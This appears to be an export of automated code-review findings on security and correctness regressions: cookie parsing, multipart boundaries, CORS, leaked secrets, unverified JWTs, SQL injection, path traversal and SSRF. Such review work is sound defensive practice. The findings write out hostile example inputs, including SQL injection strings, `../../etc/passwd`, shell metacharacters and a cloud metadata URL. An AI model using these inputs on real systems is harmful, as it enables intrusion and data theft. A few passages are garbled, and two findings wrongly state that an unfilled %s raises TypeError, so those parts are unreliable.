findings.body: A new `HTTPAdapter()` is instantiated on every call, so each request gets a brand-new connection pool that is then discarded — connection reuse across requests on a single `Session` is lost, and the sockets it opens are never explicitly closed (`close()` is now a no-op). The adapter should be created once in `__init__` and stored on the session, with `close()` delegating to it.

findings.title: cookies property returns None on parse failure, breaking all callers
findings.body:
When `SimpleCookie.load()` raises (malformed `Cookie:` header — fully attacker-controlled), the new property assigns `self._cookies = None` and returns it. Every consumer treats the return value as a mapping:

- `web.py:321` — `if name in self.request.cookies` raises `TypeError: argument of type 'NoneType' is not iterable`.
- `web.py:367` — `self.request.cookies.iterkeys()` raises `AttributeError: 'NoneType' object has no attribute 'iterkeys'`.

The replaced code never produced this state: on failure it called `self.clear_all_cookies()`, leaving `_cookies` as an (already-constructed) empty `SimpleCookie`, so the mapping contract always held. The result is a 500 on any request with a malformed cookie header, i.e. the error path turns a recoverable parse failure into a request failure.

Fix: assign an empty mapping instead — `self._cookies = {}` (or leave the freshly constructed empty `SimpleCookie()` in place) so the property always returns something dict-like. Note that the old `clear_all_cookies()` side effect (emitting Set-Cookie deletions) cannot live in `HTTPRequest` anyway, so it must not simply be restored here.

_Also raised by the security agent:_ Malformed Cookie header makes request.cookies None, crashing all callers

findings.title: No test covers the malformed-cookie exception path after the move
findings.body: The moved cookies property now sets self._cookies = None on a parse failure, whereas the previous RequestHandler.cookies property called self.clear_all_cookies() on failure (which iterates self.cookies.iterkeys(), implying it expected a dict-like object, not None). With _cookies now None, later calls to `self.request.cookies[name]` in RequestHandler.get_cookie (web.py line 321) or `self.request.cookies.iterkeys()` in clear_all_cookies (web.py line 367) would raise a TypeError on any request with a malformed Cookie header. No test exercises a malformed/invalid Cookie header through get_cookie or clear_all_cookies, so this regression would not be caught.

findings.title: Incomplete docstring for HTTPRequest.cookies property
findings.body: The docstring states 'A dictionary of Cookie.Morsel objects' but does not document that the property can return `None` on cookie parsing failure. When an exception occurs during `self._cookies.load()` on line 522, the property sets `self._cookies = None` and returns it. Callers relying on this being a dict-like object could encounter a TypeError. The docstring should note this possible return value.

findings.title: Public RequestHandler.cookies removed without an alias
Split fields not stripped: ' boundary' never matches 'boundary'
findings.body:
`content_type.split(";")` leaves the leading space that virtually every client emits (`multipart/form-data; boundary=----WebKitFormBoundary...`). After `field.partition("=")`, `k` is `" boundary"`, so the comparison `k == "boundary"` is false, the loop never breaks, and control falls into the `for ... else` branch that logs "Invalid multipart/form-data" — the body is never parsed and `self._request.files`/`arguments` stay empty. The previous `'boundary=' in content_type` test was whitespace-insensitive, so this is a regression for the common case rather than an edge case.

Fix by normalising each field, e.g. `k, sep, v = field.strip().partition("=")` (and lower-case `k`, since parameter names are case-insensitive per RFC 2045).

findings.title: Content-Type params not stripped: boundary missed / parser differential
findings.body:
`content_type.split(";")` yields parameters with their leading OWS intact, and the comparison `k == "boundary"` is done on the unstripped key. For the normal, RFC-conformant header `Content-Type: multipart/form-data; boundary=abc` the key is `" boundary"`, so the branch never fires, the `for ... else` runs, and the body is dropped with only a warning — every multipart upload silently loses its fields.

The security-relevant consequence is a parser differential on a fully attacker-controlled header. A front-end proxy, WAF or upload scanner that parses Content-Type per RFC 2045 takes the *first* `boundary` parameter; this code takes the first one that happens to have no leading whitespace. A request such as `multipart/form-data; boundary=A;boundary=B` is therefore split on `A` by the inspecting hop and on `B` by Tornado, so the two see different part sets — the classic way to smuggle a part past content inspection. The same mismatch applies to the RFC-permitted quoted form `boundary="abc"`, whose quotes are passed through to `_parse_mime_body` verbatim.

Fix: normalise each parameter before comparing, e.g. `k, sep, v = field.strip().partition("=")` and strip surrounding quotes from `v` (`v.strip('"')`), and case-fold the key since parameter names are case-insensitive.

_Also raised by the correctness agent:_ Quoted boundary value passed through with surrounding quotes

findings.title: New boundary-parsing logic has no test covering realistic Content-Type headers
findings.body: The change replaces a simple 'boundary=' substring search with a split-on-';' plus partition-on-'=' loop, and moves the 'Invalid multipart/form-data' warning into a for/else clause. Neither the case where boundary is not the first field, nor the case where the boundary field has a leading space (e.g. 'multipart/form-data; boundary=xyz', which is the common real-world format), nor the fallback warning path, is exercised by any test in this diff. Since k is compared with a strict '==' against the literal string 'boundary' without stripping whitespace, a header like 'multipart/form-data; boundary=xyz' will fail to match (k is ' boundary' with a leading space) and silently fall through to the else-branch warning instead of parsing the body. No test would catch this regression.

findings.title: Untested invalid-port branch in get_host hides a broken exception call
findings.body: get_host raises LocationParseError with a %s format placeholder but passes no argument (line 100), so calling get_host on a URL with a non-numeric port (e.g. 'google.com:abc/') would raise TypeError instead of the intended LocationParseError. No test in this diff exercises the ':' port-parsing branch or the non-digit port failure path, so this defect would go undetected. Add a test that calls get_host with a malformed port and asserts LocationParseError is raised with a sensible message.

findings.title: LocationParseError message has an unfilled %s placeholder
findings.body:
`raise LocationParseError("Failed to parse: %s")` builds the message with a `%s` format placeholder but never supplies an argument, so callers and logs see the literal string `Failed to parse: %s` instead of the URL that failed. This makes the exception useless for diagnosing a bad host/port. Fix by interpolating the input, e.g. `raise LocationParseError("Failed to parse: %s" % url)` (or the original full url, if that is the more useful value).

_Also raised by the security agent:_ LocationParseError message has an unfilled %s placeholder

findings.title: Error message has format placeholder but no argument
findings.body: The `LocationParseError` exception message on line 100 contains a `%s` format placeholder but does not provide the URL value to substitute. The message says "Failed to parse: %s" but is raised as `LocationParseError("Failed to parse: %s")` with no second argument. This means users will see the literal string "Failed to parse: %s" in error output, which is unhelpful and contradicts the message's claim to report the URL that failed parsing.

findings.title: get_host splits userinfo on the first '@', not the last
findings.body: RFC 3986 defines the authority's userinfo as everything up to the *last* `@`. Splitting on the first one means `http://a@b@example.com/` yields host `b@example.com` here, while urlparse and browsers yield `example.com`. Any caller that feeds a user-supplied URL through `get_host` for an allow/deny decision and then connects with a different parser can be made to disagree with itself. Use `url.rsplit('@', 1)` to match the RFC. I do not see the callers in this diff, so I cannot name a concrete entry point — this is a parser-differential hazard rather than a demonstrated bypass.

findings.title: `HTTPMove.location` now returns a URL object, breaking documented string contract
findings.body:
Previously `self.location` held the exact string passed to the constructor; now it holds `URL(location)`. The documented contract (docs/web_reference.rst) states the attribute is "the string it was constructed with" and that application code compares it against configured strings and calls `str.startswith` on it. A `yarl.URL` has no `startswith` method, so such callers will raise `AttributeError`, and `exc.location == "/login"` comparisons will silently become `False`. Additionally `URL()` normalises/percent-encodes the input, so even `str(exc.location)` is not guaranteed to round-trip to the original string.

If a URL form is wanted, keep `self.location` as the original string and expose the parsed value under a new name (e.g. `self.location_url`), or at minimum update the documented contract and any in-tree callers in the same change.

_Also raised by the security agent:_ location attribute changes from str to URL, breaking redirect-target checks

findings.title: Public attribute now violates documented contract
findings.body: The `location` attribute is now assigned a `URL` object instead of the string it was constructed with. The documentation in `docs/web_reference.rst` explicitly states it should be 'the string it was constructed with' and notes that 'Application code compares it against configured strings and passes it to `str.startswith`'. Code relying on this contract will break: `URL` objects do not support `str.startswith()` and comparisons against strings will fail.

findings.title: No test guards HTTPMove.location's documented string type
findings.body: self.location is now assigned URL(location) instead of the original string, contradicting the documented contract in docs/web_reference.rst that location is 'the string it was constructed with' and is used with str.startswith. There is no test in this change (or apparently in the existing suite, since none is touched) asserting that self.location remains a string equal to the constructor argument. If this attribute-type change is wrong, nothing in the test suite would fail.

findings.title: Single `if` before `_wait` can make readany() return b"" before EOF
findings.body: `_wait()` documents that the waiter "is also resolved at the end of a chunk, which can happen with no new data in the buffer, so a caller must re-check its condition after waking rather than assuming data arrived." With the loop replaced by a single `if`, `readany` wakes once, does not re-check, and falls straight into `self._read_nowait(-1)` with an empty buffer and `_eof` still false — returning `b""`. For stream readers `b""` is the EOF sentinel, so every caller looping `while chunk := await resp.content.readany()` (or `read_chunk`-style consumers) will terminate early and silently truncate the body. Restore the `while` loop so the buffer/eof condition is re-checked after each wake.

findings.title: No test guards against spurious-wakeup empty reads on readany
findings.body: The change converts the while-loop retry into a single if, meaning if _wait() resolves without new data being added to the buffer (per the documented behavior in _wait's docstring: 'the waiter is also resolved at the end of a chunk, which can happen with no new data in the buffer'), readany() will fall through to _read_nowait(-1) with an empty buffer and return an empty bytes object prematurely, rather than looping back to wait for real data. No test exists in this diff or apparently in the surrounding suite that simulates a waiter being woken without new data being fed, so this regression would not be caught by CI.

findings.title: Implicit relative import breaks module import on Python 3
findings.body: `from adapters import HTTPAdapter` is an implicit relative import. Python 3 removed implicit relative imports (PEP 328), so this resolves against `sys.path` rather than the `requests` package and raises `ModuleNotFoundError: No module named 'adapters'` — unless an unrelated top-level `adapters` module happens to be installed, in which case a wrong `HTTPAdapter` is bound. Either way `import requests` fails or misbehaves at import time, taking down every consumer of the library. Restore `from .adapters import HTTPAdapter`, matching the explicit relative form already used on line 6.

findings.title: Unqualified `adapters` import is hijackable via sys.path shadowing
findings.body:
`from adapters import HTTPAdapter` no longer binds to the in-package `requests/adapters.py`; it is resolved against `sys.path`. Under Python 2 it happens to work only because the package directory is implicitly searched; under Python 3 it will either raise `ImportError` or, worse, silently pick up whatever top-level module named `adapters` appears first on `sys.path` — including `sys.path[0]`, which is the invoking script's directory (or `''`/cwd for `-c`, `-m` and interactive use). Anyone able to write `adapters.py` into that directory gets arbitrary code executed inside every process that imports `requests.sessions`, and gets to substitute their own `HTTPAdapter` (i.e. control TLS verification and transport behaviour for all requests).

Restore the explicit relative form: `from .adapters import HTTPAdapter`. This is a one-character fix and removes the ambiguity entirely.

findings.title: get_cookie raises TypeError when Cookie header is unparseable
findings.body: `self.request.cookies` is documented to return `None` when the Cookie header is present but cannot be parsed (see the `cookies` property in tornado/httpserver.py, which says "every consumer has to allow for that"). With the guard removed, `name in self.request.cookies` evaluates `in` against `None` and raises `TypeError: argument of type 'NoneType' is not iterable`, turning any request with a malformed Cookie header into a 500 for every handler that calls `get_cookie`. This is remotely triggerable by any client that sends a garbage Cookie header. Restore the guard: `if self.request.cookies is not None and name in self.request.cookies:` (or normalise the property to return `{}`, but that would be a separate contract change affecting other consumers).

findings.title: Code contradicts documented behavior of request.cookies
findings.body: The get_cookie method now calls `name in self.request.cookies` without checking if `self.request.cookies` is None. However, the cookies property docstring (from httpserver.py) explicitly documents: 'Set to None when the Cookie header is present but cannot be parsed, so every consumer has to allow for that.' This change violates that contract and will raise a TypeError if cookies is None.

findings.title: Docstring no longer matches implementation
findings.body: The docstring 'Gets the value of the cookie with the given name, else default' is incomplete. It does not document what happens when the Cookie header is malformed and request.cookies is None—the method will now raise a TypeError instead of returning the default as the docstring implies.

findings.title: Malformed Cookie header causes TypeError in get_cookie (remote DoS)
findings.body:
`HTTPRequest.cookies` is documented to return `None` when the Cookie header is present but cannot be parsed (see `tornado/httpserver.py`: "Set to None when the Cookie header is present but cannot be parsed, so every consumer has to allow for that"). Removing the `is not None` check means `name in self.request.cookies` evaluates `name in None`, raising `TypeError: argument of type 'NoneType' is not iterable`.

Entry point: the `Cookie:` request header, fully attacker-controlled and requiring no authentication. Sink: the `in` containment test on line 3, reached by any handler calling `get_cookie` / `get_secure_cookie` / `check_xsrf_cookie`. The result is an unhandled exception and a 500 on every such request — cheap, repeatable, and it can take out login/XSRF paths for any client that can be induced to send (or that has been given) an unparseable cookie.

Restore the guard: `if self.request.cookies is not None and name in self.request.cookies:`.

findings.title: No test exercises get_cookie with a malformed Cookie header
findings.body: get_cookie now assumes self.request.cookies is never None, but the cookies property (tornado/httpserver.py) explicitly documents that it can be None when the Cookie header is present but unparseable. There is no test in this diff, and apparently none in the surrounding suite, that calls get_cookie with a malformed Cookie header to catch the regression of dropping the None check.

findings.title: Dropping .strip() makes boundary lookup fail for spaced params
findings.body: `content_type.split(";")` leaves the optional whitespace that RFC 7231 permits around parameter separators attached to each segment. For the near-universal header form `multipart/form-data; boundary=----WebKitFormBoundaryXYZ`, the second field is `" boundary=----WebKitFormBoundaryXYZ"`, so `field.partition("=")` yields `k == " boundary"`, the `k == "boundary"` test on line 5 is never true, `_parse_mime_body` is never called, and the request body is dropped without any error — `request.body_arguments` and `request.files` come back empty. Restore `field.strip().partition("=")` (and note `v` may also need stripping/unquoting, but at minimum the key must be trimmed).

findings.title: Dropped .strip() lets clients choose whether the body is parsed
findings.body:
`field` comes straight from splitting the client-supplied `Content-Type` header on `;`. Without `.strip()`, the second element of the standard header `multipart/form-data; boundary=abc` is `" boundary=abc"`, so `k` is `" boundary"` and the `k == "boundary"` test on line 5 never fires — `_parse_mime_body` is never called and the multipart body is silently discarded (no error, no log). Conversely, a client that omits the space (`multipart/form-data;boundary=abc`) does get parsed.

Two consequences worth separating:
1. Functional: well-behaved clients (browsers, curl, requests) all emit the space form, so form fields and file uploads vanish for essentially every real upload.
2. Security: whether the body is interpreted as multipart is now decided by a single space in an attacker-controlled header. Any fronting component that parses the header correctly (WAF, reverse proxy, upload scanner, request logger) will see and inspect the parts, while Tornado will not — and vice versa when the space is omitted. That whitespace-sensitive divergence is the classic shape of a parser-differential/filter-bypass, and it is chosen by the requester.

Also note that with the strip gone, `v` is no longer trimmed either, so any boundary value reaching `_parse_mime_body` can now carry trailing whitespace.

Restore the strip: `k, sep, v = field.strip().partition("=")`, and ideally strip `v` of surrounding quotes/whitespace before use.

findings.title: No test guards multipart boundary parsing against whitespace regression
findings.body: The diff removes .strip() from the field before partitioning on '=', which will break matching 'k == "boundary"' whenever the content-type header has a space after the semicolon (e.g. 'multipart/form-data; boundary=xyz', the common real-world format). Nothing in this PR adds or updates a test that would catch this regression — no test file is included in the diff.

findings.title: Error message format placeholder without argument
findings.body: The error message contains a format placeholder `%s` but no argument is provided. When this exception is raised, Python will either fail with a TypeError (if using older formatting) or the placeholder will appear literally in the error message shown to users, making the error uninformative and misleading. The `url` variable should be passed as the second argument to preserve the original behavior documented by the format string.

findings.title: No test exercises the invalid-port LocationParseError path
findings.body: The line now raises `LocationParseError("Failed to parse: %s")` with no interpolation argument, which will itself raise a TypeError at runtime when a non-digit port is parsed. Nothing in this diff (or evidently in the existing suite, since this passed review) calls the URL/port parsing function with a bad port to trigger this branch and assert on the resulting exception or message. Add a test that parses a URL with a non-numeric port and asserts the raised error's message.

findings.title: Format placeholder left unsubstituted in LocationParseError message
findings.body: `"Failed to parse: %s"` is now passed to `LocationParseError` without its interpolation argument, so the raised exception literally reads `Failed to parse: %s`. Nothing tells the caller (or a log reader) which URL failed to parse, and the stray `%s` makes the message look like a formatting bug. Restore the argument: `raise LocationParseError("Failed to parse: %s" % url)`.

findings.title: Unquoted interpolation into shell=True command breaks on ordinary inputs
findings.body:
`cmd` is assembled by f-string interpolation and handed to `subprocess.run(..., shell=True)`, so the shell re-parses `name` and `directory`. For plainly reachable inputs this is simply wrong: a directory such as `/data/my exports` is split into two tar operands, and a name containing `;`, `&&`, `$(...)` or backticks causes the shell to run additional commands with this process's privileges. Note the sibling `list_exports` on line 5 already uses the correct form — an argument list with no shell. Do the same here: `subprocess.run(["tar", "-czf", f"/exports/{name}.tar.gz", directory], check=True)`, and validate that `name` has no path separators so it cannot escape `/exports/` (e.g. `name="../../etc/x"` still writes outside the directory even with the list form).

_Also raised by the security agent:_ Command injection via shell=True with interpolated name/directory

findings.title: No test coverage for create_archive's shell command construction
findings.body: create_archive builds a shell command string via f-string interpolation and executes it with shell=True. There is no test file in this diff exercising this function, so a change that broke escaping, introduced injection, or altered the command format would not be caught by any existing test suite.

findings.title: Wildcard CORS origin combined with credentials: true
findings.body:
`dashboardCors` sets `origin: "*"` together with `credentials: true`. The existing middleware directly above deliberately restricts to `ALLOWED`; this new export removes that restriction entirely for whatever routes mount it.

Entry point: the `Origin` header on a cross-site request from any page a victim visits while authenticated. Sink: the `Access-Control-Allow-Origin` / `Access-Control-Allow-Credentials` response headers emitted by this middleware, which is what tells the browser it may read the response of a cookie-bearing cross-origin request. The net effect is that any origin can make authenticated reads of dashboard responses on behalf of a logged-in user — a same-origin-policy bypass, not merely a CSRF window.

Note also that this configuration is self-inconsistent: browsers reject a literal `*` in `Access-Control-Allow-Origin` when `Access-Control-Allow-Credentials: true` is present, so either the dashboard's credentialed requests will fail outright, or something upstream (a proxy, or a later change to reflect `req.headers.origin`) rewrites the header and the bypass becomes live. Both outcomes are bad.

Fix: reuse `ALLOWED`, or supply an explicit origin-validation function listing the dashboard's own origins, and keep `credentials: true` only against that allowlist. Never combine `"*"` with credentials.

findings.title: origin:"*" with credentials:true is rejected by browsers
findings.body:
`cors({ origin: "*", credentials: true })` makes the middleware emit the literal header `Access-Control-Allow-Origin: *` together with `Access-Control-Allow-Credentials: true`. Per the Fetch spec, a response with the wildcard origin is never accepted for a request whose credentials mode is `include`, so any dashboard fetch/XHR sending cookies or an `Authorization` header via `withCredentials` will fail the CORS check — the preflight or the response will be blocked and the request will error in the browser. The intent ("open CORS for the dashboard" while keeping credentials) is therefore not achieved by this configuration.

Reflect the requesting origin instead of using `*` — e.g. pass an explicit allow-list (as the existing `ALLOWED` value on line 6 appears to do) or an origin callback that echoes back the validated origin — so that `Access-Control-Allow-Origin` carries a concrete origin and `Vary: Origin` is set. Echoing arbitrary origins with `credentials: true` would work mechanically but makes the endpoint readable by any site, so the allow-list form is the one that both works and is safe.

findings.title: Exported CORS config violates spec and misleads callers
findings.body: The `dashboardCors` export combines `origin: "*"` with `credentials: true`, which violates the CORS specification. Browsers reject such configurations and will fail credential-bearing requests silently. A caller using this export will not achieve their intended effect, and the export name suggests it should work for the dashboard. Either the origin must be specific (not wildcard), credentials must be false, or the export needs a comment explaining this will not function as callers might expect.

findings.title: Live payments API secret hardcoded, replacing env var lookup
findings.body:
`ACMEPAY_SECRET_KEY` is committed as a literal with the `acme_live_` prefix, which by AcmePay-style convention denotes a production (non-test) secret key. The previous code read it from `os.environ["ACMEPAY_SECRET_KEY"]`, so this change moves a production credential out of the deployment environment and into version control, where it is visible to everyone with repository read access, to CI logs, to forks, and to any mirror or backup — permanently, since git history retains it.

Actions: (1) treat this key as compromised and rotate it at the provider immediately; (2) restore the `os.environ["ACMEPAY_SECRET_KEY"]` lookup (or a secrets-manager fetch); (3) purge the literal from git history, not just from HEAD, since the commit is already pushed; (4) consider adding a pre-commit secret scanner so `acme_live_` prefixes fail the build.

findings.title: Per-environment key configuration removed; all envs now use the live key
findings.body: `client()` previously resolved its key at call time from `os.environ["ACMEPAY_SECRET_KEY"]`, which is what let dev, CI and staging point at non-production credentials. After this change the key is a module-level constant whose value is prefixed `acme_live_`, and there is no remaining code path that consults the environment (the `os` import was deleted). Any process that imports this module — including test runs and staging deploys — will now authenticate as production and perform real charges/refunds. Restore the environment lookup (optionally with the literal removed entirely and a clear error when the variable is unset) rather than baking a single key into the source.

findings.title: client() behaviour change (env var → hardcoded key) has no test
findings.body: The diff changes client() to set acmepay.api_key from a hardcoded module-level constant instead of os.environ['ACMEPAY_SECRET_KEY']. No test in this PR (or apparently in the repo) calls client() and asserts what api_key ends up being set to. If this were reverted, or if the constant were wrong, nothing would fail. The new tests/fixtures/acmepay.py only defines a fake_client() fixture helper and a TEST_KEY constant — it contains no assertions and is not itself a test.

findings.title: Test double returns a dict where the real client() returns the acmepay module
findings.body: `client()` in `billing/acmepay_client.py` returns the `acmepay` module object, so callers use it as `client().Charge.create(...)` or similar attribute access. `fake_client()` returns `{"api_key": TEST_KEY}`, a plain dict with no such attributes. Substituting it for `client()` in a test will either raise `TypeError`/`AttributeError` or, worse, pass only because the test never exercises the returned object. Make the fixture return a stub object that mirrors the attributes the production code actually touches.

findings.title: tenant_id read from JWT with signature verification disabled
findings.body:
`tenant_of()` calls `jwt.decode(token, options={"verify_signature": False})` and returns `unverified["tenant_id"]`. A JWT is a client-supplied bearer value; with verification off, anyone holding any token (or no valid token at all — an unsigned/garbage-signature token decodes fine here) can set `tenant_id` to an arbitrary value by base64-encoding their own payload. Every caller that uses this to select a tenant scope, a database shard, or a row filter will operate on whatever tenant the attacker names, which is cross-tenant read/write.

The sibling `claims_for()` on line 7 already does the right thing: `jwt.decode(token, public_key(), algorithms=["RS256"])`. `tenant_of()` should be implemented on top of it — `return claims_for(token)["tenant_id"]` — and the key lookup cost addressed by caching `public_key()` rather than by skipping verification. If the tenant id is genuinely needed *before* a key can be resolved (e.g. to pick a per-tenant signing key), the unverified value must be treated as a routing hint only, named accordingly, and the claims re-read from the verified payload afterwards; it must never be the value that authorises access.

I cannot see the callers in this diff or in retrieved context, so the concrete blast radius depends on how the return value is used; the function name and the PR title ("Read the tenant id straight from the token") both indicate it is used for tenant selection.

findings.title: Public function `tenant_of()` undocumented signature bypass
findings.body: The function `tenant_of()` is a public API that intentionally disables JWT signature verification (line 11: `options={"verify_signature": False}`), but this critical security property is not documented. A competent caller could easily mistake this for a safe way to extract the tenant ID when in fact it trusts any provided token without validation. This is a contract that cannot be inferred from the function name or signature alone, and misuse would lead to security failures.

findings.title: verify_signature=False also disables exp/nbf/aud checks in PyJWT
findings.body: In PyJWT, setting `options={"verify_signature": False}` turns off the remaining registered-claim validations as well (`verify_exp`, `verify_nbf`, `verify_aud`, `verify_iss` default to off when signature verification is off). So `tenant_of` will happily return a tenant id from a token that `claims_for` on line 7 would have rejected as expired. Any caller that treats `tenant_of` as "the tenant this request belongs to" gets a value derived from a token that is not currently valid. If a tenant id really must be read before the key lookup, verify first (or at minimum pass `options={"verify_signature": False, "verify_exp": True}`) and re-check the claim against the verified payload afterwards.

findings.title: New unverified-token tenant extraction has no test coverage
findings.body: tenant_of() introduces a security-relevant behavior change (reading tenant_id from a token without verifying its signature) but no test file is included in this diff. If this function were changed to verify the signature, to read a different claim, or to be removed entirely, nothing in the test suite would catch it.

findings.title: Missing ownership check lets any user edit others' payment methods
findings.body:
`update_payment_method` takes `pm_id` straight from the request, fetches the object with `PaymentMethod.get(pm_id)` (line 12) and writes `body["billing_name"]` to it (line 13) followed by `pm.save()` (line 14). No authorisation check occurs between the load and the mutation. The read handler directly above does call `require_owner(current_user(request), pm)` on line 6, and `api/auth.py` documents that `current_user` is "Authentication only — never authorisation" and that "Every object mutation must call" `require_owner`. Note that line 11 binds `user` and then never uses it, which is the fingerprint of the omitted check.

Fix: insert `require_owner(user, pm)` immediately after line 12, before any attribute assignment or save. Consider also guarding `body["billing_name"]` with a presence/type check so a missing key returns a 400 rather than an unhandled KeyError.

_Also raised by the correctness agent:_ update_payment_method mutates object without require_owner check

_Also raised by the correctness agent:_ Unvalidated body access raises KeyError on missing billing_name

_Also raised by the docs agent:_ Public API contract violated: missing ownership check

findings.title: No test coverage for update_payment_method ownership/authz behavior
findings.body: update_payment_method mutates a PaymentMethod loaded solely by pm_id, without calling require_owner (contrast with the adjacent read endpoint at lines 5-7 which does call it). No test file is included in this diff, so there is nothing that would fail if a user updates another user's payment method. Given the sibling function demonstrates the expected pattern (require_owner call), a test asserting Forbidden is raised for a non-owner would have caught this regression.

findings.title: Rate limit removed from password reset endpoint
findings.body: `request_reset` no longer carries `@rate_limit("5/hour")`, and the `limits` import was dropped with it, so nothing in this file throttles the handler. The only parameter, `email`, is attacker-supplied and flows straight into `send_reset_email(email)` on line 2 with no gating. An unauthenticated caller can now loop on this endpoint to (a) mail-bomb an arbitrary victim address with reset messages, (b) burn outbound mail quota / provider reputation, and (c) probe for account existence if the response or timing differs for unknown addresses. Restore the decorator, or move the throttle to a shared middleware/gateway layer and note that here so the removal is auditable. If the limit genuinely moved elsewhere, the PR should say where.

findings.title: request_reset now sends reset emails with no per-caller bound
findings.body: The `@rate_limit("5/hour")` decorator and its import were deleted, so every call to `request_reset` reaches `send_reset_email(email)` unconditionally and the handler always returns `{"sent": True}`. There is no other guard in the function body, so the number of outbound reset mails per email address is now limited only by how fast a client can issue requests — enabling mailbox flooding, user-enumeration probing at scale, and unbounded load/cost on the mail path. A behavioural side effect worth confirming: callers that previously could observe a 429 from this endpoint will never see one again. If the limiter genuinely moved to middleware or a gateway, that should be stated; otherwise restore the decorator or add an equivalent per-email/per-IP throttle before `send_reset_email`.

findings.title: No test would catch removal of rate limiting on password reset
findings.body: The `@rate_limit("5/hour")` decorator was removed from `request_reset`, but no test file is included in this diff to verify rate-limiting behavior on this endpoint. If a test asserting the limiter's presence or behavior existed and were run, it should fail after this change; since none is shown, this regression would silently ship undetected.

findings.title: read_export_preview skips _confined, allowing path traversal
findings.body:
`read_export_preview` builds the path with `os.path.join(EXPORT_ROOT, name)` and opens it directly. `os.path.join` does not normalise `..` segments and discards the prefix entirely when the second argument is absolute, so `name="../../etc/passwd"` or `name="/etc/passwd"` reads a file outside `EXPORT_ROOT`. The handler immediately above takes the same untrusted `name` and passes it through `_confined(name)` first, which is evidently the intended containment step. Route this function through `_confined` as well: `path = _confined(name)`, then `fh.read(limit)`.

_Also raised by the security agent:_ read_export_preview skips _confined(), allowing arbitrary file read

findings.title: Public function lacks documenting its path handling contract
findings.body: `read_export_preview` is a public function (exported at module level, callable by name) whose contract cannot be worked out from its signature alone. The `name` parameter's validation semantics are undocumented, and a caller cannot tell whether it is safe to pass untrusted input. The sibling function `read_export` (line 13–16) calls `_confined(name)` before opening the file; this function does not, yet nothing in the signature or docstring warns of the difference. A caller familiar with `read_export` could easily assume `read_export_preview` is equally safe, leading to a path-traversal vulnerability.

findings.title: New unconfined path-reading function has no test coverage
findings.body: read_export_preview builds a path via os.path.join(EXPORT_ROOT, name) without going through _confined() like the sibling function above it. No test file is present in this diff, so nothing would catch either (a) a path-traversal regression if this omission is a bug, or (b) a future change that accidentally breaks the truncation/limit behavior. A test asserting that a name like '../../etc/passwd' is rejected, and one asserting read_export_preview respects the limit parameter, would catch regressions here.

findings.title: Ownership check removed: bulk_export returns other tenants' reports
findings.body:
`bulk_export` fetches every `Report` named in the caller-supplied `report_ids` and serialises it directly, with no tenant scoping. The `require_owner(user, report)` loop that enforced `obj.tenant_id == user.tenant_id` was deleted along with its import, and nothing replaced it: `user` is now computed on line 5 and never read, which is the tell that the only consumer of the identity was the check that went away. Any authenticated user can enumerate or guess report IDs and receive full `to_dict()` payloads belonging to other tenants.

If the motivation was the per-item cost of `require_owner`, keep the control and make it cheap: fetch with a tenant predicate (e.g. `Report.get_many(report_ids, tenant_id=user.tenant_id)`) so the filter happens in one query, and raise `Forbidden` if the returned count is smaller than `len(report_ids)` rather than silently truncating. Dropping the check entirely is not a performance trade-off, it removes the authorization boundary.

_Also raised by the security agent:_ Tenant ownership check removed from bulk_export (IDOR)

findings.title: Public API `bulk_export` lacks documented tenant contract
findings.body: `bulk_export` is a public endpoint that returns reports, but has no docstring explaining what tenant filtering applies. The authorization check was removed (lines 8-9 in the old version), so callers cannot infer from the code whether the function returns only the caller's reports or reports from any tenant. A competent caller would get this wrong—they would assume multi-tenant safety that is no longer there. Add a docstring clarifying the tenant visibility contract, or restore the authorization check.

findings.title: No test guards ownership enforcement in bulk_export
findings.body: bulk_export previously called require_owner for each report before returning it; that call has been deleted. There is no test in this diff (or apparently in the repo, based on what's shown) that exercises bulk_export with a report belonging to a different tenant. Such a test would have failed immediately when the ownership check was removed, catching the regression. Since no such test exists, this change can ship silently.

findings.title: SQL injection via f-string interpolation in search_customers
search_customers interpolates values into SQL, bypassing execute()'s params contract
findings.body:
`execute(sql, params=None)` is documented as "Run a parameterised query. `params` must carry every caller value." Line 10 calls it with no `params` at all, because line 9 has already spliced `term` and `status` directly into the statement text. Two concrete consequences:

1. Any value containing a single quote terminates the literal. A legitimate customer search for `O'Brien` produces syntactically invalid SQL and raises at the driver; a hostile `term` such as `' OR '1'='1` (or one ending in `';DROP ...`) becomes executable statement text, so the caller controls the query rather than just a value.
2. `term` is also unescaped for LIKE metacharacters, so `%` or `_` in user input silently changes the match semantics.

Fix by following the pattern already used on line 5 and letting the driver bind the values, building the wildcards in Python:

```python
def search_customers(term, status):
    return execute(
        "SELECT * FROM customers WHERE name LIKE %s AND status = %s",
        (f"%{term}%", status),
    )
```

findings.title: search_customers has no test coverage at all
findings.body: The new function `search_customers` builds a query via f-string interpolation and calls `execute` with no params argument. Nothing in this diff exercises this function, so a test asserting correct parameterisation (or even just correct query results) would immediately have caught the missing `%s`/params pattern used one line above in `get_customer`. As it stands, any behavior change here — correct or incorrect — would pass silently since no test invokes it.

findings.title: verify_endpoint fetches caller-supplied URL, bypassing ALLOWED_HOSTS check
findings.body:
The existing send path immediately above parses the URL's host and rejects anything not in `ALLOWED_HOSTS` before issuing the request (lines 8-10). `verify_endpoint` takes the same kind of caller-supplied `url` and passes it straight to `requests.get` with no host check and no scheme check, so it is a server-side request forgery primitive: a customer registering a webhook target can point it at `http://169.254.169.254/...`, internal admin services, or `file://`-adjacent schemes supported by adapters, and read back at least the status code as an oracle.

Apply the same validation the module already defines 
tbefore issuing the request 
tfactor the host parse + `ALLOWED_HOSTS` membership test into a shared helper and call it from both functions. Also consider `allow_redirects=False`, since a redirect from an allowlisted host would otherwise re-introduce the same bypass.

_Also raised by the security agent:_ SSRF: verify_endpoint fetches arbitrary URL, skipping ALLOWED_HOSTS check

findings.title: New verify_endpoint has no test coverage for SSRF-relevant behavior
findings.body: verify_endpoint(url) issues an unrestricted GET to any caller-supplied URL, unlike the sibling function above it which validates host against ALLOWED_HOSTS before posting. There is no test in this diff exercising verify_endpoint, so if it were changed to add validation, removed, or if the missing validation is a regression, nothing would fail. Add a test that asserts verify_endpoint rejects disallowed/internal hosts (mirroring the existing host-check behavior) or, if no such check is intended, a test documenting the expected allowed-URL behavior.

findings.title: verify_endpoint raises instead of returning a status for unreachable hosts
findings.body: The function's name and return shape (an int status code) suggest it reports reachability, but `requests.get` raises `ConnectionError`, `Timeout` (guaranteed reachable here, the target is user-supplied and may be a black hole), `TooManyRedirects` or `InvalidURL` rather than returning. Any caller doing `if verify_endpoint(url) == 200:` will get an exception for exactly the failure cases it is trying to detect. Catch `requests.RequestException` and return a sentinel, or document that the function raises and make the caller handle it.

